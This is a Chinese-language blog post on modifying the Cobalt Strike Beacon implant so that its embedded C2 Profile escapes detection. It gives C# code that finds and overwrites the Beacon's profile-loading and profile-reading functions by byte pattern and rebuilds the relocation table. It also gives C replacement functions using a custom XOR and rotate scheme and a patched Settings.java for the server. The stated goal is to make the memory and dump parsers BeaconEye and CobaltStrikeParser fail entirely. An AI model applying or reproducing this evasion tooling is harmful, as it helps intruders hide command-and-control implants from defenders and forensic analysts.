---
title: CS研究（一）-重写Beacon的Profile的结构与相关函数
date: 2023-08-28 00:00:00
updated: 2023-08-28 00:00:00
lang: zh-CN
categories:
- [Cobalt Strike]
tags:
- Cobalt Strike
- Beacon
toc: true
---

<!-- # CS研究（一）-重写Beacon的Profile的结构与相关函数 -->

本文介绍了魔改CS Beacon的C2 Profile的底层结构和解密读取函数，达到彻底绕过BeaconEye的目的，并且让现有C2 Profile解析工具完全失效，无法从内存或Dump中提取C2 Profile。

<!-- more -->

## 前言

从CS 4.0~4.7，Beacon的C2 Profile结构都是完全一致的，并且解密函数，读取每一条字段的函数也是完全一致的（CS4.5加了部分SleepMask的支持，PTR类型的数据会在休眠时加密，但是似乎用处不大）。常见的工具如BeaconEye、CobaltStrikeParser都是可以很轻松的找到内存中C2 Profile的位置并且解析它的字段。

绕过BeaconEye的方法有简单的，比如把memset的第二个参数的0改成随机数，让BeaconEye的yara规则无法匹配到。但是个人认为这种方法不够完美，是可以绕过的。其次对于CobaltStrikeParser，如果拿到了存在于CS马内部的beacon.bin，再怎么改beacon.bin内部的xor数也没什么用，特征定位依然可以找到C2 Profile的位置和xor数，最后完成解析。

所以我们要从根本上解决问题，直接重写整个C2 Profile的相关函数，全部自定义，让公开工具彻底失效。

当然，由于CS并没有像SleepMask、ReflectiveLoader那样提供开放的接口让我们自定义，所以我们需要像使用手术刀一般精确的修改原始的PE文件，包括特征定位到函数位置，确定函数大小，最后修复重定位表。

## 分析Beacon的C2 Profile加载

### 解密与加载Profile

首先我们要分析CS的Beacon是怎么解密内部加密的C2 Profile并读取每一个字段的。

我们先把cobaltstrike.jar内的sleeve资源解密，随便找一个beacon.dll。这里我们选一个64位的beacon.x64.dll拖进IDA分析，因为64位的编译器优化不会乱改调用约定，好分析很多。

转到DllMain，这是我好早好早以前第一次分析一个CS修改版时注释好的一份，直接拉出来用了。

![](./1.png)

这里有个LoadSettings函数，用处是加载C2 Profile，参数是当前模块的基址。我们观察执行路径，可以知道是fwReason等于DLL_PROCESS_ATTACH（1）的时候执行，也就是说，在模块加载的时候就进行解析C2 Profile。

我们进入这个函数内部，观察运行流程。

![](./2.png)

这里可以看到LoadSettings函数首先对EncryptedSettings进行了解密，解密方式是异或同一个数（修改版CS，这里的数和原版不一样）。同时用malloc分配了一段内存，用来保存解密后的C2 Profile。malloc分配的内存不是0字节填充的，所以会用memset进行清零（修改版CS，不是用0传给memset了）。

接着开始读取beacon内部的C2 Profile，格式是2字节ID+2字节类型+2字节长度+数据，读取到ID小于等于0的时候就退出读取。这里2字节ID是从1开始的，到100左右结束。2字节类型表示接下来的数据长度，值为1表示是一个2字节数据，值为2表示是一个4字节数据，值为3表示使用接下来的2字节值作为数据长度。

这里附上伪代码表示的C2 Profile：

``` cs
Setting[n] Settings;

struct Setting {
    ushort Id;
    ushort Type;
    ushrot Length;
    byte[n] Data;
}
```

我们可以看到，原始格式的C2 Profile并不支持随机读取，也就是不能直接根据ID找到对应的字段内容，所以Beacon把这段数据转移到了新的结构体上。分析的是64位，所以对齐到8字节，这里用伪代码表示：

``` cs
SettingMEM64[n] Settings;

struct SettingMEM64 {
    ushort Type;
    byte[6] Padding;
    ulong ValueOrPointer;
}
```

如果Type为1，那么ValueOrPointer就只有2字节有效，表示2字节值；如果Type为2，那么ValueOrPointer就只有4字节有效，表示4字节值；如果Type为3，那么ValueOrPointer就表示指针，指向一个以0结尾的数据。注意，这里很重要！Type为3的时候，指针指向的数据以0结尾，因为这个结构体没有表示数据长度的地方，我们自定义算法的时候一样要保持这个特性，不然Beacon无法正确获取Type为3的数据的长度！

最后LoadSettings函数把原始的EncryptedSettings清零以防止扫描，这样内存中就只有一份通过malloc分配的C2 Profile了。

### 读取Profile中的字段

在知道Beacon怎么加载C2 Profile后，我们要找到Beacon是怎么访问内存中通过malloc分配的C2 Profile的，我们用IDA的xref功能查找Settings的所有引用。

![](./3.png)

这个唯一的其它引用就是GetSetting函数，我们点进去查看。

![](./4.png)

这个GetSetting函数的作用是根据ID获取整个SettingMEM64结构体，分析也和之前的结论一致。注意这里的返回值是OWORD，是16字节类型。

对GetSetting函数的引用有三处，它们分别是获取Type为1、2、3时候的值，这样查看引用可以看见。

![](./5.png)

这个是GetSettingShort，获取Type为1时的2字节值：

![](./6.png)


这个是GetSettingInt，获取Type为2时的4字节值：

![](./7.png)


这个是GetSettingData，获取Type为3时的多字节值：

![](./8.png)

这三个函数的时候都是先调用GetSetting获取SettingMEM64条目，然后判断前两个字节的Type是不是符合这个函数调用（比如GetSettingInt里Type就必须为2），不符合就返回0，符合就返回对应的结果。

这里很重要的一点，如果Type不符合，就要返回0，在自定义算法的时候这里也是一个坑，Beacon内有ID不存在依然获取值的情况，不符合这个行为就会导致Beacon崩溃！！！

### 各版本Beacon的情况

我分析了从4.0到4.8的Beacon，4.8因为存在大改，Profile的加载和之前有完全不一样的地方了，所以这里不讨论。从4.0到4.7还是完全一致的，并且函数都没有被内联，也就是说我们可以比较方便的通过特征码定位到这些函数，判断函数边界以及分析引用。

在x86下，MSVC编译器有优化内部函数调用约定的行为，所以这里面一些函数的可能存在使用usercall自定义参数寄存器的情况（LoadSettings就是如此，eax是作为LoadSettings的第一个参数寄存器）。

除此之外，还要注意的是有些版本下存在尾调用（tail call）的优化，也就是最后一条指令不再是ret了。

还要一些版本，不知道为什么编译的时候压根没有开优化，一点没开，也是要单独做处理的。

当然，这几个特殊情况都不是很麻烦，做额外处理的代码量并不大。

## 重写相关函数

在分析了C2 Profile的加载读取后，我们就可以想办法开始定位这些函数，并修改它们了。

接下来我都是把项目中的关键代码写出来，对项目本身做一个源码讲解。更完整详细的内容请去GitHub下载源码查看。

### 定位

第一步当然是定位，我们选特征码定位。这里有很明显的特征，就是EncryptedSettings字段的内容是固定的"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"，CS的服务端也是直接搜索这串字符串定位到EncryptedSettings然后写入。

这样我们的思路就很清晰了，先找到EncryptedSettings，然后模拟IDA查找引用，唯一的引用处就是LoadSettings函数了。

我们直接在beacon.x64.dll文件中搜索"AAAABBBBCCCCDDDDEEEEFFFF"（CS服务端没有搜完整的字符串，只搜了这一部分），然后再确认一遍是否正确。查找完成后，我们把结果保存到encryptedSettings字段，它的大小是固定的4096字节，也就是0x1000。

这里的FileSpan表示在文件中的偏移与大小。

``` cs
/// <summary>
/// Find stuff about 'EncryptedSettings'
/// </summary>
/// <returns></returns>
bool FindEncryptedSettings() {
	var rawData = peImage.RawSpan;
	var offset = (FileOffset)rawData.IndexOf("AAAABBBBCCCCDDDDEEEEFFFF"u8);
	if (peImage.ToSectionHeader(offset)?.DisplayName != ".data")
		return false;
	int length = rawData[(int)offset..].IndexOf((byte)'\0');
	var text = Encoding.ASCII.GetString(rawData.Slice((int)offset, length));
	encryptedSettings = new FileSpan(offset, 0x1000);
	Debug.Assert(text == "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR");
	return true;
}
```

接下来我们要查找引用了EncryptedSettings的LoadSettings。

![](./9.png)

所有的Beacon中LoadSettings都是使用REX.W + 8D /r	LEA r64,m，后面使用80 /6 ib XOR r/m8, imm8。所以我们先使用特征码搜索，在.text节找到lea reg, \[rip+disp32\]，其中rip+disp32指向EncryptedSettings。

在这之后我们搜索xor指令，xor的立即数就是我们要的C2 Profile的解密key。

``` cs
/// <summary>
/// Find stuff about 'LoadSettings'
/// </summary>
/// <returns></returns>
bool FindLoadSettingsX64() {
	var leaRegMem = new ushort[] { 0x48, 0x8D, 0b00111000_00000101 };
	// lea reg, [rip+disp32]
	var leaRegMemOffset = FindCodePattern(leaRegMem).Where(t => peImage.ToFileOffset(peImage.DecodeRel32(t + 3)) == encryptedSettings.FileOffset).Single();
	// Find lea reg, [EncryptedSettings]
	var xorMemImm8 = new ushort[] { 0x80, 0x34, 0b00111111_00000000 };
	var xorMemImm8Offset = FindCodePattern(xorMemImm8, leaRegMemOffset, 0x20).First();
	xorKey = peImage.RawSpan[(int)(xorMemImm8Offset + 3)];
	// Find xor key
	loadSettings = LdasmFindFunction(leaRegMemOffset);
	if (peImage.RawSpan[(int)(loadSettings.FileOffset + loadSettings.Size - 1)] == 0xCC)
		loadSettings = new FileSpan(loadSettings.FileOffset, loadSettings.Size - 1);
	// TODO: Detect tail call automatically
	imageBaseRVA = peImage.DecodeRel32(FindCodePattern(new byte[] { 0x48, 0x89, 0x0D }, loadSettings.FileOffset, leaRegMemOffset - loadSettings.FileOffset).Single() + 3);
	// Get ImageBase RVA
	settingsRVA = peImage.DecodeRel32(FindCodePattern(new byte[] { 0x48, 0x89, 0x05 }, loadSettings.FileOffset, leaRegMemOffset - loadSettings.FileOffset).Single() + 3);
	// Get Settings RVA
	Debug.Assert(settingsRVA == imageBaseRVA + 8);
	return true;
}
```

LoadSettings函数的偏移大小都保存在了loadSettings字段，还有相关的xor key，Settings，ImageBase的信息。

因为我们通过特征定位找到的是函数中间的位置，所以我们还要一个算法来查找函数开头和结束。这里我们简单的使用ldasm引擎，去查找离当前指令最近的前后两条ret/int3，以这个作为函数开始和结束。对于这种简单的场景，这种简单的算法就够了。

然后我们和使用IDA分析一样，顺着LoadSettings里的Settings去找GetSetting函数，判断条件就是引用了Settings但是不在LoadSettings函数内。

``` cs
/// <summary>
/// Find stuff about 'GetSetting'
/// </summary>
/// <returns></returns>
bool FindGetSettingX64() {
	var movRegMem = new ushort[] { 0x48, 0x8B, 0b00111000_00000101 };
	// mov reg, [rip+disp32]
	var movRaxMem = new byte[] { 0x48, 0xA1 };
	// mov rax, [rip+disp32]
	var movRegMemOffset = FindCodePattern(movRegMem).Where(t => peImage.DecodeRel32(t + 3) == settingsRVA)
		.Concat(FindCodePattern(movRaxMem).Where(t => peImage.DecodeRel32(t + 2) == settingsRVA)).Where(t => !IsInSpan(loadSettings, t)).Single();
	// Find mov reg, [Settings]
	getSetting = LdasmFindFunction(movRegMemOffset);
	return true;
}
```

找到的GetSetting函数的信息保存在了getSetting字段里。

最后我们去查找引用了GetSetting函数的另外三个函数，它们分别是GetSettingShort、GetSettingInt、GetSettingData。

这三个函数查找起来很容易，和之前一样是通过分析引用。但是它们太像了，很难区别谁是谁。这里我们用个小技巧，它们都会判断各自的Type是不是需要的，我们根据判断Type的指令的立即数来确定这个函数是处理Type多少的。

判断Type，它们都使用了cmp，我们在GetSettingShort、GetSettingInt、GetSettingData内部搜这个特征码就行了。

``` cs
/// <summary>
/// Find stuff about 'GetSettingShort', 'GetSettingInt', 'GetSettingData'
/// </summary>
/// <returns></returns>
bool FindGetSettingValueGeneric() {
	var getSettingValues = FindCodePattern(new byte[] { 0xE8 }).Where(t => peImage.DecodeRel32(t + 1) == peImage.ToRVA(getSetting.FileOffset)).Select(LdasmFindFunction).ToArray();
	// Find all call GetSetting
	if (getSettingValues.Length != 3)
		return false;
	var cmpReg16Imm8Offsets = getSettingValues.Select(t => FindCodePattern(new ushort[] { 0x66, 0x83, 0b00000111_11111000 }, t.FileOffset, t.Size).Single()).ToArray();
	// Find all cmp reg16, type
	getSettingShort = getSettingValues.Where((_, i) => peImage.RawSpan[(int)(cmpReg16Imm8Offsets[i] + 3)] == 1).Single();
	// cmp reg16, 1
	getSettingInt = getSettingValues.Where((_, i) => peImage.RawSpan[(int)(cmpReg16Imm8Offsets[i] + 3)] == 2).Single();
	// cmp reg16, 2
	getSettingData = getSettingValues.Where((_, i) => peImage.RawSpan[(int)(cmpReg16Imm8Offsets[i] + 3)] == 3).Single();
	// cmp reg16, 3
	return true;
}
```

这样我们所有需要定位的函数和字段就都收集完成了。我们按顺序调用它们，然后建立一个符号表，把它们都保存起来，以供下一步修改使用。

``` cs
/// <summary>
/// Find all symbols
/// </summary>
/// <returns></returns>
public bool FindAll() {
	if (!FindEncryptedSettings()) {
		Console.WriteLine("Can't find function 'EncryptedSettings'");
		return false;
	}
	Console.WriteLine($"Found field 'EncryptedSettings' at 0x{encryptedSettings.FileOffset:X} (RVA: 0x{peImage.ToRVA(encryptedSettings.FileOffset):X})");
	if (!FindLoadSettings()) {
		Console.WriteLine("Can't find function 'LoadSettings'");
		return false;
	}
	Console.WriteLine($"Found xor key: 0x{xorKey:X2}");
	Console.WriteLine($"Found function 'LoadSettings' at 0x{loadSettings.FileOffset:X} (RVA: 0x{peImage.ToRVA(loadSettings.FileOffset):X}, Size: 0x{loadSettings.Size:X})");
	Console.WriteLine($"Found field 'ImageBase' at RVA 0x{imageBaseRVA:X}");
	Console.WriteLine($"Found field 'Settings' at RVA 0x{settingsRVA:X}");
	if (!FindGetSetting()) {
		Console.WriteLine("Can't find function 'GetSetting'");
		return false;
	}
	Console.WriteLine($"Found function 'GetSetting' at 0x{getSetting.FileOffset:X} (RVA: 0x{peImage.ToRVA(getSetting.FileOffset):X}, Size: 0x{getSetting.Size:X})");
	if (!FindGetSettingValue()) {
		Console.WriteLine("Can't find function 'GetSettingShort', 'GetSettingInt', 'GetSettingData'");
		return false;
	}
	Console.WriteLine($"Found function 'GetSettingShort' at 0x{getSettingShort.FileOffset:X} (RVA: 0x{peImage.ToRVA(getSettingShort.FileOffset):X}, Size: 0x{getSettingShort.Size:X})");
	Console.WriteLine($"Found function 'GetSettingInt' at 0x{getSettingInt.FileOffset:X} (RVA: 0x{peImage.ToRVA(getSettingInt.FileOffset):X}, Size: 0x{getSettingInt.Size:X})");
	Console.WriteLine($"Found function 'GetSettingData' at 0x{getSettingData.FileOffset:X} (RVA: 0x{peImage.ToRVA(getSettingData.FileOffset):X}, Size: 0x{getSettingData.Size:X})");
	symbols.Clear();
	symbols.Add(SymbolId.EncryptedSettings, new Symbol(peImage.ToRVA(encryptedSettings.FileOffset), false, 0));
	symbols.Add(SymbolId.LoadSettings, new Symbol(peImage.ToRVA(loadSettings.FileOffset), true, loadSettings.Size));
	symbols.Add(SymbolId.ImageBase, new Symbol(imageBaseRVA, false, 0));
	symbols.Add(SymbolId.Settings, new Symbol(settingsRVA, false, 0));
	symbols.Add(SymbolId.GetSetting, new Symbol(peImage.ToRVA(getSetting.FileOffset), true, getSetting.Size));
	symbols.Add(SymbolId.GetSettingShort, new Symbol(peImage.ToRVA(getSettingShort.FileOffset), true, getSettingShort.Size));
	symbols.Add(SymbolId.GetSettingInt, new Symbol(peImage.ToRVA(getSettingInt.FileOffset), true, getSettingInt.Size));
	symbols.Add(SymbolId.GetSettingData, new Symbol(peImage.ToRVA(getSettingData.FileOffset), true, getSettingData.Size));
	// Build symbol table
	return true;
}
```

### 修改

在完成定位后，我们就可以根据这些函数信息做修改了。

我们要先获取自定义算法的函数大小，然后填充回原函数位置，如果原函数大小不足填充，我们就要在其它位置分配空间，然后在原函数位置写jmp跳转过去，接着我们根据已有的符号信息，把各个符号间的引用关系修复，最后把PE的重定位表重写，抹去旧函数的重定位信息，把我们新函数的重定位信息填上。

这个思路是比较清晰的，只是实现起来略麻烦一些。

因为原始的LoadSettings占用空间是比较大的，我们自己的实现比较小，所以我们把LoadSettings作为原函数大小不足时的代码分配位置。

``` cs
var (loadSettingsRVA, loadSettingsSize) = (symbols[SymbolId.LoadSettings].RVA, symbols[SymbolId.LoadSettings].Size);
if ((uint)functions[SymbolId.LoadSettings].Code.Length > loadSettingsSize)
	return false;
var allocationBase = loadSettingsRVA + (uint)functions[SymbolId.LoadSettings].Code.Length;
// Use 'LoadSettings' as allocation base
```

这里的functions变量是我们的自定义算法实现，假设我们已经写好了。

我们对自定义的函数进行地址分配。

``` cs
foreach (var (functionId, function) in functions) {
	var symbol = symbols[functionId];
	var offset = peImage.ToFileOffset(symbol.RVA);
	rawData.Slice((int)offset, (int)symbol.Size).Fill(0xCC);
	symbol.NewImpl = function;
	if (function.Code.Length <= symbol.Size) {
		// New code can be placed in the old position
		symbol.NewCodeRVA = symbol.RVA;
		Console.WriteLine($"Allocated '{functionId}' at RVA 0x{symbol.NewCodeRVA:X} (Size: 0x{function.Code.Length:X})");
		continue;
	}
	symbol.NewCodeRVA = allocationBase;
	Console.WriteLine($"Allocated '{functionId}' at RVA 0x{allocationBase:X} (Size: 0x{function.Code.Length:X}, OriginalRVA: 0x{symbol.RVA:X})");
	allocationBase += (uint)function.Code.Length;
	if (allocationBase > loadSettingsRVA + loadSettingsSize)
		return false;
	// Check overflow
}
// Clear old code and allocate new code base
```

然后我们移除之前的重定位信息。

``` cs
var relocationTableDirectory = peImage.OptionalHeader.BaseRelocationDirectory;
int relocationTableOffset = (int)peImage.ToFileOffset(relocationTableDirectory.VirtualAddress);
var relocationTable = RelocationTable.Create(rawData.Slice(relocationTableOffset, (int)relocationTableDirectory.Size));
foreach (var (functionId, function) in functions) {
	var symbol = symbols[functionId];
	relocationTable.RemoveRange(symbol.RVA, symbol.Size);
}
```

地址分配完成后，我们就要对新函数做修正，包括符号引用和跳转修复。在32位下，所有的重定位信息都是绝对地址，64位下都是相对偏移，最后把重定位信息重写了。

``` cs
foreach (var functionId in functions.Keys) {
	Console.WriteLine($"Overwriting '{functionId}'");
	WriteFunction(functionId, relocationTable);
}
var relocationTableBytes = relocationTable.ToBytes();
relocationTableBytes.CopyTo(rawData[relocationTableOffset..]);
relocationTableDirectory.Size = (uint)relocationTableBytes.Length;
// Write all override functions

void WriteFunction(SymbolId functionId, RelocationTable relocationTable) {
	var rawData = peImage.RawSpan;
	var symbol = symbols[functionId];
	var function = symbol.NewImpl;
	var newCodeOffset = peImage.ToFileOffset(symbol.NewCodeRVA);
	function.Code.CopyTo(rawData[(int)newCodeOffset..]);
	// Write function body
	Debug.Assert(Is64Bit ? function.Fixups.All(t => t.IsRelative) : function.Fixups.All(t => !t.IsRelative));
	foreach (var fixup in function.Fixups) {
		if (fixup.IsRelative) {
			var immOffset = newCodeOffset + fixup.Offset;
			var targetRVA = symbols[fixup.Id].RVA;
			rawData[(int)immOffset..].WriteInt32((int)(targetRVA - (symbol.NewCodeRVA + fixup.Offset + 4)));
		}
		else {
			var immOffset = newCodeOffset + fixup.Offset;
			var targetRVA = symbols[fixup.Id].RVA;
			rawData[(int)immOffset..].WriteUInt32((uint)targetRVA + (uint)peImage.OptionalHeader.ImageBase);
			relocationTable.Add(peImage.ToRVA(immOffset), RelocationTable.IMAGE_REL_BASED_HIGHLOW);
		}
		// Do fixup (now only supports rel32 and abs32)
	}
	if (symbol.RVA != symbol.NewCodeRVA) {
		var thunkOffset = peImage.ToFileOffset(symbol.RVA);
		rawData[(int)thunkOffset] = 0xE9;
		rawData[(int)(thunkOffset + 1)..].WriteInt32((int)(symbol.NewCodeRVA - symbol.RVA - 5));
	}
	// Write function thunk
}
```

此时我们对beacon.x64.dll的C2 Profile相关函数的重写就完成了，32位的状况也类似，就是特征码定位那边稍微改一下。

### 自定义算法

在完成修改后，我们写一段自定义的加载算法和读取算法试一下，但是注意，这里几个坑点一定不能踩！

一个是

> 注意，这里很重要！Type为3的时候，指针指向的数据以0结尾，因为这个结构体没有表示数据长度的地方，我们自定义算法的时候一样要保持这个特性，不然Beacon无法正确获取Type为3的数据的长度！

还有一个是

> 这三个函数的时候都是先调用GetSetting获取SettingMEM64条目，然后判断前两个字节的Type是不是符合这个函数调用（比如GetSettingInt里Type就必须为2），不符合就返回0，符合就返回对应的结果。

我们自定义算法的行为一定要和原始Beacon内的完全一致。

我们先添加一个C项目，写上必需的几个成员。为了让我们能够自动化提取（我的obj文件解析还没做好，暂时只能靠PE导出表），我们把这几个成员都设置为导出函数。

``` c
__declspec(dllexport) HMODULE ImageBase = NULL;
__declspec(dllexport) uint8_t EncryptedSettings[4096] = { 0 };
__declspec(dllexport) uint8_t* Settings = NULL;

__declspec(dllexport) void __fastcall LoadSettings(HMODULE hModule) {}
__declspec(dllexport) uint16_t __fastcall GetSettingShort(int id) {}
__declspec(dllexport) uint32_t __fastcall GetSettingInt(int id) {}
__declspec(dllexport) uintptr_t __fastcall GetSettingData(int id) {}
```

然后我们要想一个自定义的C2 Profile的数据结构，这里我用的是这样的：C2 Profile分为两个区域，第一个区域称为slot，是一个4字节整形数组；第二个区域称为data，保存了Type为3时的数据。

当Type为1或者2的时候，slot的4字节刚好够保存值，如果Type为3，那么slot就保存数据在C2 Profile中的偏移。

对应的函数实现如下：

``` c
__declspec(dllexport) void __fastcall LoadSettings(HMODULE hModule) {
	ImageBase = hModule;
}

__declspec(dllexport) uint16_t __fastcall GetSettingShort(int id) {
	uint32_t* slots = (uint32_t*)EncryptedSettings;
	return (uint16_t)slots[id];
}

__declspec(dllexport) uint32_t __fastcall GetSettingInt(int id) {
	uint32_t* slots = (uint32_t*)EncryptedSettings;
	return (uint32_t)slots[id];
}

__declspec(dllexport) uintptr_t __fastcall GetSettingData(int id) {
	uint32_t* slots = (uint32_t*)EncryptedSettings;
	uint32_t offset = slots[id];
	return offset ? (uintptr_t)(EncryptedSettings + offset) : 0;
}
```

接着我们为它添加加密解密算法。

这里我用了Settings当作解密的key，EncryptedSettings保持不动，解密后留在内存里。因为我们已经修改了C2 Profile的格式，所以把解密的EncryptedSettings留在内存里面没有什么问题，不会被工具扫描到。

这里我随便写了一个使用异或多字节加比特旋转位移的加密算法，目的不是特别高的强度，而是让现有的解析工具失效。体积够小，强度一般不能被爆破就可以了。

``` c
__declspec(dllexport) void __fastcall LoadSettings(HMODULE hModule) {
	ImageBase = hModule;
	uint8_t* settings = EncryptedSettings;
	uint32_t key = 0xEA8FC01D;
	Settings = (uint8_t*)(uintptr_t)key;
	uint8_t* keyBytes = (uint8_t*)&key;
	for (int i = 0; i < 4096; ++i) {
		keyBytes[(i + 2) % 4] += settings[i];
		settings[i] = (settings[i] << 3) | (settings[i] >> 5);
		settings[i] ^= keyBytes[i % 4];
	}
}
```

然后是GetSettingShort、GetSettingInt、GetSettingData的实现。我们想在EncryptedSettings被初步解密后，依然保存部分加密的状态，在真正读取的时候临时解密，防止别人直接查看内存发现C2 Profile的信息。

``` c
__declspec(dllexport) uint16_t __fastcall GetSettingShort(int id) {
	uint32_t* slots = (uint32_t*)EncryptedSettings;
	uint32_t key = (uint32_t)(uintptr_t)Settings;
	return (uint16_t)slots[id] ^ key;
}

__declspec(dllexport) uint32_t __fastcall GetSettingInt(int id) {
	uint32_t* slots = (uint32_t*)EncryptedSettings;
	uint32_t key = (uint32_t)(uintptr_t)Settings;
	return slots[id] ^ key;
}

__declspec(dllexport) uintptr_t __fastcall GetSettingData(int id) {
	uint32_t* slots = (uint32_t*)EncryptedSettings;
	uint32_t key = (uint32_t)(uintptr_t)Settings;
	uint32_t offset = slots[id] ^ key;
	return offset ? (uintptr_t)(EncryptedSettings + offset) : 0;
}
```

然后我们编译出exe，利用导出表自动提取出这些函数就可以了。

``` cs
public static void Generate(byte[] data, StringBuilder sb) {
	var peImage = new PEImage(data);
	bool is64 = peImage.FileHeader.Machine.Is64Bit();
	var symbolToRVAs = GetExportedEntries(peImage).ToDictionary(t => Enum.Parse<SymbolId>(t.Key.Replace("@8", "").Replace("@4", "").Replace("@", "")), t => t.Value);
	var rvaToSymbols = symbolToRVAs.ToDictionary(t => t.Value, t => t.Key);
	var functionTable = new List<(SymbolId, Function)>();
	foreach (var (id, rva) in symbolToRVAs) {
		if (peImage.ToSectionHeader(peImage.ToFileOffset(rva))?.DisplayName != ".text")
			continue;
		var start = peImage.ToFileOffset(rva);
		uint end = LdasmHelper.LdasmFindEnd(peImage.RawSpan, (uint)start, is64);
		var code = peImage.RawSpan[(int)start..(int)end];
		var fixups = new List<FixupInfo>();
		for (uint i = 0; i < (uint)code.Length;) {
			byte size = Ldasm.ldasm(code[(int)i..], out var ld, is64);
			Debug.Assert((ld.flags & Ldasm.F_INVALID) == 0);
			int count = 0;
			if (ld.disp_size != 0)
				count += MatchSymbols(i + ld.disp_offset, ld.disp_size);
			if (ld.imm_size != 0)
				count += MatchSymbols(i + ld.imm_offset, ld.imm_size);
			Debug.Assert(count <= 1);
			i += size;
		}
		functionTable.Add((id, new Function(code.ToArray(), fixups.ToArray())));

		int MatchSymbols(uint offset, byte size) {
			if (size == 0)
				return 0;
			int count = 0;
			var target = DecodeRel(peImage, start + offset, size);
			if (rvaToSymbols.TryGetValue(target, out var targetId)) {
				fixups.Add(new FixupInfo(offset, targetId, true));
				count++;
				Debug.Assert(size == 4);
			}
			if (size == 4) {
				target = peImage.DecodeAbs32(start + offset);
				if (rvaToSymbols.TryGetValue(target, out targetId)) {
					fixups.Add(new FixupInfo(offset, targetId, false));
					count++;
				}
			}
			return count;
		}
	}
	functionTable.Sort((a, b) => a.Item1 - b.Item1);
	var suffix = is64 ? "X64" : "X86";
	sb.AppendLine($"\t#region Impl{suffix}");
	foreach (var (id, (code, fixups)) in functionTable) {
		sb.AppendLine($"\tstatic readonly Function {id}{suffix} = new(");
		sb.AppendLine($"\t\tnew byte[] {{ {string.Join(", ", code.Select(t => $"0x{t:X2}"))} }},");
		sb.AppendLine("\t\tnew FixupInfo[] {");
		foreach (var fixup in fixups)
			sb.AppendLine($"\t\t\tnew(0x{fixup.Offset:X2}, {nameof(SymbolId)}.{fixup.Id}, {fixup.IsRelative.ToString().ToLowerInvariant()}),");
		sb.AppendLine("\t\t}");
		sb.AppendLine("\t);");
		sb.AppendLine();
	}
	sb.Remove(sb.Length - Environment.NewLine.Length, Environment.NewLine.Length);
	sb.AppendLine($"\t#endregion");
	sb.AppendLine();
	sb.AppendLine($"\tpublic static readonly IReadOnlyDictionary<SymbolId, Function> FunctionTable{suffix} = new Dictionary<SymbolId, Function> {{");
	foreach (var (id, _) in functionTable)
		sb.AppendLine($"\t\t{{ {nameof(SymbolId)}.{id}, {id}{suffix} }},");
	sb.AppendLine("\t};");
}
```

因为我们是直接修改原始的beacon.x64.dll并且改了C2 Profile的数据结构，那么我们还得修改CS服务端写入C2 Profile到beacon.x64.dll的地方，在Settings.java。

我们换成和这个自定义解密算法对应的加密实现。

``` java
package beacon;

import common.AssertUtils;
import common.CommonUtils;
import common.Packer;


import java.util.HashMap;
import java.util.Map;

public class Settings {
    public static final int PATCH_SIZE = 4096;
    public static final int MAX_SETTINGS = 128;

    protected Map<Short, Object> values = new HashMap<>();
    protected Packer patch = new Packer();

    public void addShort(int id, int value) {
        AssertUtils.TestRange(id, 0, MAX_SETTINGS);
        values.put((short) id, (short) value);
    }

    public void addInt(int id, int value) {
        AssertUtils.TestRange(id, 0, MAX_SETTINGS);
        values.put((short) id, value);
    }

    public void addData(int id, byte[] value, int maximumLength) {
        AssertUtils.TestRange(id, 0, MAX_SETTINGS);
        byte[] bytes = new byte[maximumLength];
        System.arraycopy(value, 0, bytes, 0, value.length);
        values.put((short) id, bytes);
    }

    public void addString(int id, String value, int maximumLength) {
        this.addData(id, value.getBytes(), maximumLength);
    }

    public byte[] toPatch() {
        return this.toPatch(PATCH_SIZE);
    }

    public byte[] toPatch(int length) {
        patch.little();
        short maxId = Short.MIN_VALUE;
        for (Short id : values.keySet()) {
            maxId = (short) Math.max(maxId, id);
        }
        int dataStart = (maxId + 1) * 4;
        int dataOffset = dataStart;
        Map<byte[], Integer> dataToOffsets = new HashMap<>();
        for (short id = 1; id <= maxId; id++) {
            if (values.containsKey(id) && values.get(id) instanceof byte[]) {
                byte[] data = (byte[]) values.get(id);
                dataToOffsets.put(data, dataOffset);
                dataOffset += data.length;
            }
        }
        AssertUtils.Test(dataOffset <= length, "");
        // Create data to offset map
        for (short id = 0; id <= maxId; id++) {
            int t;
            if (values.containsKey(id)) {
                Object value = values.get(id);
                if (value instanceof Short) {
                    t = (short) value;
                } else if (value instanceof Integer) {
                    t = (int) value;
                } else {
                    t = dataToOffsets.get(value);
                }
            } else
                t = 0;
            t ^= 0xEA8FC01D;
            patch.addInt(t);
        }
        // Write slots
        AssertUtils.Test(patch.size() == dataStart, "");
        for (short id = 1; id <= maxId; id++) {
            if (values.containsKey(id) && values.get(id) instanceof byte[]) {
                byte[] data = (byte[]) values.get(id);
                patch.addString(data, data.length);
            }
        }
        AssertUtils.Test(patch.size() == dataOffset, "");
        // Write datas
        byte[] padding = CommonUtils.randomData(length - patch.getBytes().length);
        this.patch.addString(padding, padding.length);
        byte[] data = this.patch.getBytes();
        data = encrypt(data);
        return data;
    }

    static byte[] encrypt(byte[] settings) {
        byte[] newSettings = new byte[settings.length];
        System.arraycopy(settings, 0, newSettings, 0, settings.length);
        byte[] key = new byte[]{(byte) 0x1D, (byte) 0xC0, (byte) 0x8F, (byte) 0xEA};
        for (int i = 0; i < newSettings.length; ++i) {
            newSettings[i] ^= key[i % key.length];
            newSettings[i] = rotateRight(newSettings[i], 3);
            key[(i + 2) % key.length] += newSettings[i];
        }
        return newSettings;
    }

    static byte rotateRight(byte bits, int shift) {
        return (byte) (((bits & 0xff) >>> shift) | ((bits & 0xff) << (8 - shift)));
    }
}
```

## 效果展示

这里我们使用CS4.5做对比，采用GitHub上开源的jQuery.profile作为C2 Profile。生成方式均采用stageless raw生成一个beacon.bin。然后用BeaconEye和CobaltStrikeParser测试对比。

## 使用教程

## 下载

